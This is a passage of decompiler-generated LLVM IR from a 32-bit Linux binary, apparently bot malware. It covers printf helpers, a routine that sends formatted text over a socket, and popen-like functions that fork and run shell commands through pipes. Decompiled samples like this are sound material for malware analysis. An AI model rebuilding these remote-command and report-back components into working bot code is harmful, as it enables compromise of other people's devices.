  br label %dec_label_pc_8048659

dec_label_pc_8048636:                             ; preds = %dec_label_pc_8048663
  %v2_804863f = mul i32 %stack_var_-36.0, 10
  %v2_8048647 = load i8, i8* %stack_var_8.1, align 1
  %v3_8048647 = zext i8 %v2_8048647 to i32
  %v5_804864d = add i32 %v3_8048647, %v2_804863f
  %v1_8048650 = add i32 %v5_804864d, -48
  %v5_8048656 = add i32 %v4_8048659, 1
  %v22_8048656 = inttoptr i32 %v5_8048656 to i8*
  br label %dec_label_pc_8048659

dec_label_pc_8048659:                             ; preds = %dec_label_pc_8048659.preheader, %dec_label_pc_8048636
  %stack_var_8.1 = phi i8* [ %v22_8048656, %dec_label_pc_8048636 ], [ %stack_var_8.0.lcssa, %dec_label_pc_8048659.preheader ]
  %stack_var_-36.0 = phi i32 [ %v1_8048650, %dec_label_pc_8048636 ], [ 0, %dec_label_pc_8048659.preheader ]
  %v4_8048659 = ptrtoint i8* %stack_var_8.1 to i32
  %v2_804865c = load i8, i8* %stack_var_8.1, align 1
  %tmp = icmp ult i8 %v2_804865c, 48
  br i1 %tmp, label %dec_label_pc_804866d, label %dec_label_pc_8048663

dec_label_pc_8048663:                             ; preds = %dec_label_pc_8048659
  %v2_8048666 = load i8, i8* %stack_var_8.1, align 1
  %tmp48 = icmp ult i8 %v2_8048666, 58
  br i1 %tmp48, label %dec_label_pc_8048636, label %dec_label_pc_804866d

dec_label_pc_804866d:                             ; preds = %dec_label_pc_8048663, %dec_label_pc_8048659
  %v2_8048670 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048673 = icmp eq i8 %v2_8048670, 115
  %v1_8048675 = icmp eq i1 %v10_8048673, false
  br i1 %v1_8048675, label %dec_label_pc_80486c4, label %dec_label_pc_8048677

dec_label_pc_8048677:                             ; preds = %dec_label_pc_804866d
  %v1_804867a = add i32 %stack_var_12.142, 4
  %v1_8048682 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048682 = load i32, i32* %v1_8048682, align 4
  %v4_8048687 = icmp eq i32 %v2_8048682, 0
  br i1 %v4_8048687, label %dec_label_pc_804869c, label %dec_label_pc_804868d

dec_label_pc_804868d:                             ; preds = %dec_label_pc_8048677
  %v5_8048690 = inttoptr i32 %v2_8048682 to i8*
  br label %dec_label_pc_804869c

dec_label_pc_804869c:                             ; preds = %dec_label_pc_8048677, %dec_label_pc_804868d
  %storemerge = phi i8* [ %v5_8048690, %dec_label_pc_804868d ], [ getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80562bd.12, i32 0, i32 0), %dec_label_pc_8048677 ]
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_80486b7 = call i32 @prints(i32 %tmp6, i8* %storemerge, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_80486bc = add i32 %v6_80486b7, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80486c4:                             ; preds = %dec_label_pc_804866d
  %v2_80486c7 = load i8, i8* %stack_var_8.1, align 1
  %v10_80486ca = icmp eq i8 %v2_80486c7, 100
  %v1_80486cc = icmp eq i1 %v10_80486ca, false
  br i1 %v1_80486cc, label %dec_label_pc_8048718, label %dec_label_pc_80486ce

dec_label_pc_80486ce:                             ; preds = %dec_label_pc_80486c4
  %v1_80486d1 = add i32 %stack_var_12.142, 4
  %v1_80486d9 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80486d9 = load i32, i32* %v1_80486d9, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804870b = sext i32 %v2_80486d9 to i64
  %v9_804870b = call i32 @printi(i32 %tmp6, i64 %v8_804870b, i32 10, i32 1, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048710 = add i32 %v9_804870b, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048718:                             ; preds = %dec_label_pc_80486c4
  %v2_804871b = load i8, i8* %stack_var_8.1, align 1
  %v10_804871e = icmp eq i8 %v2_804871b, 120
  %v1_8048720 = icmp eq i1 %v10_804871e, false
  br i1 %v1_8048720, label %dec_label_pc_804876c, label %dec_label_pc_8048722

dec_label_pc_8048722:                             ; preds = %dec_label_pc_8048718
  %v1_8048725 = add i32 %stack_var_12.142, 4
  %v1_804872d = inttoptr i32 %stack_var_12.142 to i32*
  %v2_804872d = load i32, i32* %v1_804872d, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_804875f = sext i32 %v2_804872d to i64
  %v9_804875f = call i32 @printi(i32 %tmp6, i64 %v8_804875f, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_8048764 = add i32 %v9_804875f, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_804876c:                             ; preds = %dec_label_pc_8048718
  %v2_804876f = load i8, i8* %stack_var_8.1, align 1
  %v10_8048772 = icmp eq i8 %v2_804876f, 88
  %v1_8048774 = icmp eq i1 %v10_8048772, false
  br i1 %v1_8048774, label %dec_label_pc_80487c0, label %dec_label_pc_8048776

dec_label_pc_8048776:                             ; preds = %dec_label_pc_804876c
  %v1_8048779 = add i32 %stack_var_12.142, 4
  %v1_8048781 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048781 = load i32, i32* %v1_8048781, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_80487b3 = sext i32 %v2_8048781 to i64
  %v9_80487b3 = call i32 @printi(i32 %tmp6, i64 %v8_80487b3, i32 16, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 65)
  %v5_80487b8 = add i32 %v9_80487b3, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_80487c0:                             ; preds = %dec_label_pc_804876c
  %v2_80487c3 = load i8, i8* %stack_var_8.1, align 1
  %v10_80487c6 = icmp eq i8 %v2_80487c3, 117
  %v1_80487c8 = icmp eq i1 %v10_80487c6, false
  br i1 %v1_80487c8, label %dec_label_pc_8048811, label %dec_label_pc_80487ca

dec_label_pc_80487ca:                             ; preds = %dec_label_pc_80487c0
  %v1_80487cd = add i32 %stack_var_12.142, 4
  %v1_80487d5 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_80487d5 = load i32, i32* %v1_80487d5, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v8_8048807 = sext i32 %v2_80487d5 to i64
  %v9_8048807 = call i32 @printi(i32 %tmp6, i64 %v8_8048807, i32 10, i32 0, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa, i32 97)
  %v5_804880c = add i32 %v9_8048807, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048811:                             ; preds = %dec_label_pc_80487c0
  %v2_8048814 = load i8, i8* %stack_var_8.1, align 1
  %v10_8048817 = icmp eq i8 %v2_8048814, 99
  %v1_8048819 = icmp eq i1 %v10_8048817, false
  br i1 %v1_8048819, label %dec_label_pc_804886f, label %dec_label_pc_804881b

dec_label_pc_804881b:                             ; preds = %dec_label_pc_8048811
  %v1_804881e = add i32 %stack_var_12.142, 4
  %v1_8048826 = inttoptr i32 %stack_var_12.142 to i32*
  %v2_8048826 = load i32, i32* %v1_8048826, align 4
  store i32 %v2_8048826, i32* %stack_var_-6, align 4
  store i32 %stack_var_-36.0, i32* @edx, align 4
  %v6_804884a = call i32 @prints(i32 %tmp6, i8* %tmp21, i32 %stack_var_-36.0, i32 %stack_var_-32.0.lcssa)
  %v5_804884f = add i32 %v6_804884a, %stack_var_-28.143
  br label %dec_label_pc_804886f

dec_label_pc_8048854:                             ; preds = %dec_label_pc_80485ff, %dec_label_pc_80485d3
  %stack_var_8.2 = phi i8* [ %stack_var_8.444, %dec_label_pc_80485d3 ], [ %v22_80485e1, %dec_label_pc_80485ff ]
  %v2_8048857 = load i8, i8* %stack_var_8.2, align 1
  %v3_8048857 = zext i8 %v2_8048857 to i32
  %v4_8048867 = call i32 @printchar(i32* %arg1, i32 %v3_8048857)
  %v4_804886c = add i32 %stack_var_-28.143, 1
  br label %dec_label_pc_804886f

dec_label_pc_804886f:                             ; preds = %dec_label_pc_8048811, %dec_label_pc_804881b, %dec_label_pc_80487ca, %dec_label_pc_8048776, %dec_label_pc_804869c, %dec_label_pc_8048722, %dec_label_pc_80486ce, %dec_label_pc_8048854
  %stack_var_8.3 = phi i8* [ %stack_var_8.2, %dec_label_pc_8048854 ], [ %stack_var_8.1, %dec_label_pc_8048811 ], [ %stack_var_8.1, %dec_label_pc_804881b ], [ %stack_var_8.1, %dec_label_pc_80487ca ], [ %stack_var_8.1, %dec_label_pc_8048776 ], [ %stack_var_8.1, %dec_label_pc_8048722 ], [ %stack_var_8.1, %dec_label_pc_80486ce ], [ %stack_var_8.1, %dec_label_pc_804869c ]
  %stack_var_12.0 = phi i32 [ %stack_var_12.142, %dec_label_pc_8048854 ], [ %stack_var_12.142, %dec_label_pc_8048811 ], [ %v1_804881e, %dec_label_pc_804881b ], [ %v1_80487cd, %dec_label_pc_80487ca ], [ %v1_8048779, %dec_label_pc_8048776 ], [ %v1_8048725, %dec_label_pc_8048722 ], [ %v1_80486d1, %dec_label_pc_80486ce ], [ %v1_804867a, %dec_label_pc_804869c ]
  %stack_var_-28.0 = phi i32 [ %v4_804886c, %dec_label_pc_8048854 ], [ %stack_var_-28.143, %dec_label_pc_8048811 ], [ %v5_804884f, %dec_label_pc_804881b ], [ %v5_804880c, %dec_label_pc_80487ca ], [ %v5_80487b8, %dec_label_pc_8048776 ], [ %v5_8048764, %dec_label_pc_8048722 ], [ %v5_8048710, %dec_label_pc_80486ce ], [ %v5_80486bc, %dec_label_pc_804869c ]
  %v4_804886f = ptrtoint i8* %stack_var_8.3 to i32
  %v5_804886f = add i32 %v4_804886f, 1
  %stack_var_8.4 = inttoptr i32 %v5_804886f to i8*
  %v2_8048875 = load i8, i8* %stack_var_8.4, align 1
  %v4_8048878 = icmp eq i8 %v2_8048875, 0
  %v1_804887a = icmp eq i1 %v4_8048878, false
  br i1 %v1_804887a, label %dec_label_pc_80485d3, label %dec_label_pc_8048880

dec_label_pc_8048880:                             ; preds = %dec_label_pc_804886f, %dec_label_pc_80485e1, %entry
  %stack_var_-28.1.lcssa = phi i32 [ 0, %entry ], [ %stack_var_-28.143, %dec_label_pc_80485e1 ], [ %stack_var_-28.0, %dec_label_pc_804886f ]
  %v4_8048880 = icmp eq i32* %arg1, null
  br i1 %v4_8048880, label %dec_label_pc_804888e, label %dec_label_pc_8048886

dec_label_pc_8048886:                             ; preds = %dec_label_pc_8048880
  %v2_8048889 = load i32, i32* %arg1, align 4
  %v1_804888b = inttoptr i32 %v2_8048889 to i8*
  store i8 0, i8* %v1_804888b, align 1
  br label %dec_label_pc_804888e

dec_label_pc_804888e:                             ; preds = %dec_label_pc_8048880, %dec_label_pc_8048886
  %v2_8048891 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8048891, i32* @ebp, align 4
  ret i32 %stack_var_-28.1.lcssa

; uselistorder directives
  uselistorder i8* %stack_var_8.4, { 1, 0 }
  uselistorder i32 %v5_804886f, { 1, 0 }
  uselistorder i32 %stack_var_-36.0, { 10, 11, 8, 9, 6, 7, 4, 5, 2, 3, 1, 0, 12 }
  uselistorder i8* %stack_var_8.1, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 14, 16, 15, 13 }
  uselistorder i32 %v5_8048623, { 1, 0 }
  uselistorder i8* %v22_80485e1, { 2, 0, 1, 3, 4 }
  uselistorder i32 %stack_var_8.4.in41, { 1, 0 }
  uselistorder i32 %stack_var_12.142, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13 }
  uselistorder i32 %stack_var_-28.143, { 0, 2, 1, 8, 7, 6, 5, 4, 3 }
  uselistorder i32* %stack_var_-6, { 1, 0 }
  uselistorder i32 %tmp6, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i64, i32, i32, i32, i32, i32)* @printi, { 0, 1, 3, 2 }
  uselistorder i32 (i32, i8*, i32, i32)* @prints, { 0, 2, 3, 1 }
  uselistorder i32* %arg1, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_804888e, { 1, 0 }
  uselistorder label %dec_label_pc_804886f, { 7, 1, 0, 2, 3, 5, 6, 4 }
  uselistorder label %dec_label_pc_804869c, { 1, 0 }
  uselistorder label %dec_label_pc_8048659, { 1, 0 }
  uselistorder label %dec_label_pc_8048623, { 1, 0 }
  uselistorder label %dec_label_pc_80485d3, { 1, 0 }
}

define i32 @zprintf(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_8 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048893 = load i32, i32* @ebp, align 4
  store i32 %v0_8048893, i32* %stack_var_-4, align 4
  %v4_8048893 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_8048893, i32* @ebp, align 4
  %v4_804889c = ptrtoint i32* %stack_var_8 to i32
  %v4_80488b4 = call i32 @print(i32* null, i32 %arg1, i32 %v4_804889c)
  %v2_80488b9 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488b9, i32* @ebp, align 4
  ret i32 %v4_80488b4

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @szprintf(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_4 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80488bb = load i32, i32* @ebp, align 4
  store i32 %v0_80488bb, i32* %stack_var_-4, align 4
  %v4_80488bb = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v4_80488bb, i32* @ebp, align 4
  %v4_80488c4 = ptrtoint i32* %stack_var_12 to i32
  %v4_80488db = call i32 @print(i32* nonnull %stack_var_4, i32 %arg1, i32 %v4_80488c4)
  %v2_80488e0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_80488e0, i32* @ebp, align 4
  ret i32 %v4_80488db

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 0, 2, 1 }
}

define i32 @Rootsprintf(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %stack_var_-20 = alloca i32, align 4
  %stack_var_12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80488e5 = load i32, i32* @edi, align 4
  store i32 %v0_80488e5, i32* %stack_var_-8, align 4
  %v1_80488f0 = call i32 @malloc(i32 2048)
  store i32 %v1_80488f0, i32* %stack_var_-20, align 4
  %v3_8048911 = inttoptr i32 %v1_80488f0 to i8*
  %v4_8048911 = call i32 @__GI_memset(i8* %v3_8048911, i32 0, i32 2048)
  %v4_804891f = ptrtoint i32* %stack_var_12 to i32
  %v4_8048936 = call i32 @print(i32* nonnull %stack_var_-20, i32 %arg2, i32 %v4_804891f)
  %v3_804894c = call i32 @_strlen(i8* %v3_8048911)
  %v6_8048953 = add i32 %v1_80488f0, %v3_804894c
  %v1_8048956 = inttoptr i32 %v6_8048953 to i8*
  store i8 10, i8* %v1_8048956, align 1
  store i1 false, i1* @df, align 1
  store i32 %v1_80488f0, i32* @edi, align 4
  %v3_804896a = call i32 @_strlen(i8* %v3_8048911)
  %v4_804898a = call i32 @__libc_send(i32 %arg1, i32 %v1_80488f0, i32 %v3_804896a, i32 16384)
  %v1_8048998 = call i32 @free(i32 %v1_80488f0)
  %v2_80489a3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_80489a3, i32* @edi, align 4
  ret i32 %v4_804898a

; uselistorder directives
  uselistorder i32 %v1_80488f0, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32* %stack_var_-20, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_80489a9 = load i32, i32* @edi, align 4
  store i32 %v0_80489a9, i32* %stack_var_-8, align 4
  %v4_80489ad = ptrtoint i8* %arg2 to i32
  %v2_80489b0 = load i8, i8* %arg2, align 1
  %v10_80489b3 = icmp eq i8 %v2_80489b0, 114
  br i1 %v10_80489b3, label %dec_label_pc_80489c1, label %dec_label_pc_80489b7

dec_label_pc_80489b7:                             ; preds = %entry
  %v2_80489ba = load i8, i8* %arg2, align 1
  %v10_80489bd = icmp eq i8 %v2_80489ba, 119
  %v1_80489bf = icmp eq i1 %v10_80489bd, false
  br i1 %v1_80489bf, label %dec_label_pc_8048b83, label %dec_label_pc_80489c1

dec_label_pc_80489c1:                             ; preds = %dec_label_pc_80489b7, %entry
  %v1_80489c4 = add i32 %v4_80489ad, 1
  %v1_80489c5 = inttoptr i32 %v1_80489c4 to i8*
  %v2_80489c5 = load i8, i8* %v1_80489c5, align 1
  %v4_80489c8 = icmp eq i8 %v2_80489c5, 0
  br i1 %v4_80489c8, label %dec_label_pc_80489d8, label %dec_label_pc_8048b83

dec_label_pc_80489d8:                             ; preds = %dec_label_pc_80489c1
  %v2_80489d8 = ptrtoint i32* %stack_var_-24 to i32
  %v2_80489de = call i32 @__GI_pipe(i32 %v2_80489d8)
  %v2_80489e3 = icmp slt i32 %v2_80489de, 0
  %v1_80489e5 = icmp eq i1 %v2_80489e3, false
  br i1 %v1_80489e5, label %dec_label_pc_80489f3, label %dec_label_pc_8048b83

dec_label_pc_80489f3:                             ; preds = %dec_label_pc_80489d8
  %v0_80489f3 = load i8*, i8** @global_var_805e700.13, align 4
  %v2_80489f8 = icmp eq i8* %v0_80489f3, null
  %v1_80489fa = icmp eq i1 %v2_80489f8, false
  br i1 %v1_80489fa, label %bb, label %dec_label_pc_80489fc

dec_label_pc_80489fc:                             ; preds = %dec_label_pc_80489f3
  %v0_80489fc = call i32 @getdtablesize()
  %tmp19 = icmp slt i32 %v0_80489fc, 1
  %tmp20 = icmp eq i1 %tmp19, false
  br i1 %tmp20, label %dec_label_pc_8048a16, label %dec_label_pc_8048b83

dec_label_pc_8048a16:                             ; preds = %dec_label_pc_80489fc
  %v2_8048a19 = mul i32 %v0_80489fc, 4
  %v2_8048a1f = call i32 @malloc(i32 %v2_8048a19)
  %v1_8048a24 = inttoptr i32 %v2_8048a1f to i8*
  store i8* %v1_8048a24, i8** @global_var_805e700.13, align 256
  %v2_8048a2e = icmp eq i32 %v2_8048a1f, 0
  %v1_8048a30 = icmp eq i1 %v2_8048a2e, false
  br i1 %v1_8048a30, label %dec_label_pc_8048a3e, label %dec_label_pc_8048b83

dec_label_pc_8048a3e:                             ; preds = %dec_label_pc_8048a16
  %v1_8048a41 = mul i32 %v0_80489fc, 4
  store i32 %v2_8048a1f, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_8048a52 = and i32 %v2_8048a1f, -256
  %v5_8048a54 = call i8* @_memset(i8* %v1_8048a24, i32 %v1_8048a52, i32 %v1_8048a41)
  br label %bb

bb:                                               ; preds = %dec_label_pc_80489f3, %dec_label_pc_8048a3e
  %v0_8048a56 = call i32 @__vfork()
  %v13_8048a64 = icmp eq i32 %v0_8048a56, -1
  br i1 %v13_8048a64, label %dec_label_pc_8048a75, label %dec_label_pc_8048a6a

dec_label_pc_8048a6a:                             ; preds = %bb
  %v4_8048a6a = icmp eq i32 %v0_8048a56, 0
  %v2_8048a9a = load i8, i8* %arg2, align 1
  %v10_8048a9d = icmp eq i8 %v2_8048a9a, 114
  %v1_8048a9f = icmp eq i1 %v10_8048a9d, false
  br i1 %v4_8048a6a, label %dec_label_pc_8048a97, label %dec_label_pc_8048b3b

dec_label_pc_8048a75:                             ; preds = %bb
  %v3_8048a75 = load i32, i32* %stack_var_-24, align 4
  %v2_8048a7b = call i32 @__libc_close(i32 %v3_8048a75)
  %v2_8048a86 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b83

dec_label_pc_8048a97:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048ad4, label %dec_label_pc_8048aa1

dec_label_pc_8048aa1:                             ; preds = %dec_label_pc_8048a97
  %v9_8048aa4 = icmp eq i32 %tmp7, 1
  br i1 %v9_8048aa4, label %dec_label_pc_8048ac7, label %dec_label_pc_8048aa9

dec_label_pc_8048aa9:                             ; preds = %dec_label_pc_8048aa1
  %v4_8048ab7 = call i32 @dup2(i32 %tmp7, i32 1)
  %v2_8048ac2 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048ac7

dec_label_pc_8048ac7:                             ; preds = %dec_label_pc_8048aa1, %dec_label_pc_8048aa9
  %v3_8048ac7 = load i32, i32* %stack_var_-24, align 4
  %v2_8048acd = call i32 @__libc_close(i32 %v3_8048ac7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048ad4:                             ; preds = %dec_label_pc_8048a97
  %v3_8048ad4 = load i32, i32* %stack_var_-24, align 4
  %v1_8048ad7 = icmp eq i32 %v3_8048ad4, 0
  br i1 %v1_8048ad7, label %dec_label_pc_8048af9, label %dec_label_pc_8048adb

dec_label_pc_8048adb:                             ; preds = %dec_label_pc_8048ad4
  %v4_8048ae9 = call i32 @dup2(i32 %v3_8048ad4, i32 0)
  %v3_8048aee = load i32, i32* %stack_var_-24, align 4
  %v2_8048af4 = call i32 @__libc_close(i32 %v3_8048aee)
  br label %dec_label_pc_8048af9

dec_label_pc_8048af9:                             ; preds = %dec_label_pc_8048ad4, %dec_label_pc_8048adb
  %v2_8048aff = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b04

dec_label_pc_8048b04:                             ; preds = %dec_label_pc_8048ac7, %dec_label_pc_8048af9
  %v8_8048b2a = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_80562ca.16 to i32), i32 ptrtoint ([3 x i8]* @global_var_80562c7.15 to i32), i32 ptrtoint ([3 x i8]* @global_var_80562c4.14 to i32), i32 %arg1, i32 0)
  %v2_8048b36 = call i32 @__GI__exit(i32 127)
  unreachable

dec_label_pc_8048b3b:                             ; preds = %dec_label_pc_8048a6a
  br i1 %v1_8048a9f, label %dec_label_pc_8048b58, label %dec_label_pc_8048b45

dec_label_pc_8048b45:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b45 = load i32, i32* %stack_var_-24, align 4
  %v2_8048b51 = call i32 @__libc_close(i32 %tmp7)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b58:                             ; preds = %dec_label_pc_8048b3b
  %v3_8048b5e = load i32, i32* %stack_var_-24, align 4
  %v2_8048b64 = call i32 @__libc_close(i32 %v3_8048b5e)
  br label %dec_label_pc_8048b69

dec_label_pc_8048b69:                             ; preds = %dec_label_pc_8048b45, %dec_label_pc_8048b58
  %stack_var_-28.0 = phi i32 [ %tmp7, %dec_label_pc_8048b58 ], [ %v3_8048b45, %dec_label_pc_8048b45 ]
  %v2_8048b6c = mul i32 %stack_var_-28.0, 4
  %v0_8048b71 = load i8*, i8** @global_var_805e700.13, align 4
  %v1_8048b71 = ptrtoint i8* %v0_8048b71 to i32
  %v2_8048b76 = add i32 %v1_8048b71, %v2_8048b6c
  %v2_8048b7b = inttoptr i32 %v2_8048b76 to i32*
  store i32 %v0_8048a56, i32* %v2_8048b7b, align 4
  br label %dec_label_pc_8048b83

dec_label_pc_8048b83:                             ; preds = %dec_label_pc_8048a16, %dec_label_pc_80489fc, %dec_label_pc_80489d8, %dec_label_pc_80489b7, %dec_label_pc_80489c1, %dec_label_pc_8048a75, %dec_label_pc_8048b69
  %stack_var_-32.0 = phi i32 [ -1, %dec_label_pc_8048a75 ], [ %stack_var_-28.0, %dec_label_pc_8048b69 ], [ -1, %dec_label_pc_80489c1 ], [ -1, %dec_label_pc_80489b7 ], [ -1, %dec_label_pc_80489d8 ], [ -1, %dec_label_pc_80489fc ], [ -1, %dec_label_pc_8048a16 ]
  %v2_8048b89 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8048b89, i32* @edi, align 4
  ret i32 %stack_var_-32.0

; uselistorder directives
  uselistorder i32 %stack_var_-28.0, { 1, 0 }
  uselistorder i32 %v0_8048a56, { 1, 2, 0 }
  uselistorder i32 %v0_80489fc, { 2, 0, 1 }
  uselistorder i32 %tmp7, { 1, 6, 5, 4, 3, 0, 2 }
  uselistorder i8* %arg2, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_8048b83, { 6, 5, 0, 1, 2, 4, 3 }
  uselistorder label %dec_label_pc_8048b69, { 1, 0 }
  uselistorder label %dec_label_pc_8048b04, { 1, 0 }
  uselistorder label %dec_label_pc_8048af9, { 1, 0 }
  uselistorder label %dec_label_pc_8048ac7, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-268 = alloca i32, align 4
  %stack_var_-136 = alloca i32, align 4
  %stack_var_-264 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8048b8c = load i32, i32* @ebp, align 4
  store i32 %v0_8048b8c, i32* %stack_var_-4, align 4
  %v0_8048b95 = load i8*, i8** @global_var_805e700.13, align 4
  %v2_8048b9a = icmp eq i8* %v0_8048b95, null
  br i1 %v2_8048b9a, label %dec_label_pc_8048cf9, label %dec_label_pc_8048b9e

dec_label_pc_8048b9e:                             ; preds = %entry
  %v1_8048b95 = ptrtoint i8* %v0_8048b95 to i32
  %v2_8048ba1 = mul i32 %arg1, 4
  %v2_8048bab = add i32 %v1_8048b95, %v2_8048ba1
  %v1_8048bae = inttoptr i32 %v2_8048bab to i32*
  %v2_8048bae = load i32, i32* %v1_8048bae, align 4
  %v1_8048bb0 = icmp eq i32 %v2_8048bae, 0
  %v1_8048bb2 = icmp eq i1 %v1_8048bb0, false
  br i1 %v1_8048bb2, label %dec_label_pc_8048bc3, label %dec_label_pc_8048cf9

dec_label_pc_8048bc3:                             ; preds = %dec_label_pc_8048b9e
  %v1_8048bc9 = call i32 @__libc_close(i32 %arg1)
  %v2_8048bce = ptrtoint i32* %stack_var_-264 to i32
  %v1_8048bd7 = call i32 @sigemptyset(i32 %v2_8048bce)
  %v2_8048bed = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 2)
  %v2_8048c03 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 3)
  %v2_8048c19 = call i32 @__GI_sigaddset(i32 %v2_8048bce, i32 1)
  %v4_8048c24 = ptrtoint i32* %stack_var_-136 to i32
  %v3_8048c39 = bitcast i32* %stack_var_-264 to %_TYPEDEF_sigset_t*
  %v4_8048c39 = call i32 @__GI_sigprocmask(i32 0, %_TYPEDEF_sigset_t* %v3_8048c39, i32 %v4_8048c24)
  %v2_8048c58 = ptrtoint i32* %stack_var_-268 to i32
  br label %dec_label_pc_8048c3e

dec_label_pc_8048c3e:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048bc3
  %v0_8048c46 = load i8*, i8** @global_var_805e700.13, align 4
  %v1_8048c46 = ptrtoint i8* %v0_8048c46 to i32
  %v2_8048c4b = add i32 %v1_8048c46, %v2_8048ba1
  %v1_8048c4e = inttoptr i32 %v2_8048c4b to i32*
  %v2_8048c4e = load i32, i32* %v1_8048c4e, align 4
  %v3_8048c65 = call i32 @__libc_waitpid(i32 %v2_8048c4e, i32 %v2_8048c58, i32 0)
  %v13_8048c70 = icmp eq i32 %v3_8048c65, -1
  %v1_8048c77 = icmp eq i1 %v13_8048c70, false
  br i1 %v1_8048c77, label %dec_label_pc_8048c85, label %dec_label_pc_8048c79

dec_label_pc_8048c79:                             ; preds = %dec_label_pc_8048c3e
  %v1_8048c79 = call i32 @__errno_location(i32 %v3_8048c65)
  %v1_8048c7e = inttoptr i32 %v1_8048c79 to i32*
  %v2_8048c7e = load i32, i32* %v1_8048c7e, align 4
  %v9_8048c80 = icmp eq i32 %v2_8048c7e, 4
  br i1 %v9_8048c80, label %dec_label_pc_8048c3e, label %dec_label_pc_8048c85

dec_label_pc_8048c85:                             ; preds = %dec_label_pc_8048c79, %dec_label_pc_8048c3e
  %v13_8048c70.lcssa = phi i1 [ true, %dec_label_pc_8048c79 ], [ false, %dec_label_pc_8048c3e ]
  %v3_8048c9e = bitcast i32* %stack_var_-136 to %_TYPEDEF_sigset_t*
  %v4_8048c9e = call i32 @__GI_sigprocmask(i32 2, %_TYPEDEF_sigset_t* %v3_8048c9e, i32 0)
  %v2_8048ca9 = mul i32 %tmp6, 4
  %v0_8048cae = load i8*, i8** @global_var_805e700.13, align 4
  %v1_8048cae = ptrtoint i8* %v0_8048cae to i32
  %v2_8048cb3 = add i32 %v1_8048cae, %v2_8048ca9
  %v1_8048cb6 = inttoptr i32 %v2_8048cb3 to i32*
  store i32 0, i32* %v1_8048cb6, align 4
  br i1 %v13_8048c70.lcssa, label %dec_label_pc_8048ced, label %dec_label_pc_8048cc5

dec_label_pc_8048cc5:                             ; preds = %dec_label_pc_8048c85
  %v3_8048cc5 = load i32, i32* %stack_var_-268, align 4
  %v1_8048cd1 = and i32 %v3_8048cc5, 65280
  %v2_8048cd81 = udiv i32 %v1_8048cd1, 256
  br label %dec_label_pc_8048ced

dec_label_pc_8048ced:                             ; preds = %dec_label_pc_8048c85, %dec_label_pc_8048cc5
  %storemerge2 = phi i32 [ %v2_8048cd81, %dec_label_pc_8048cc5 ], [ -1, %dec_label_pc_8048c85 ]
  %v2_8048cff.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_8048cf9

dec_label_pc_8048cf9:                             ; preds = %entry, %dec_label_pc_8048b9e, %dec_label_pc_8048ced
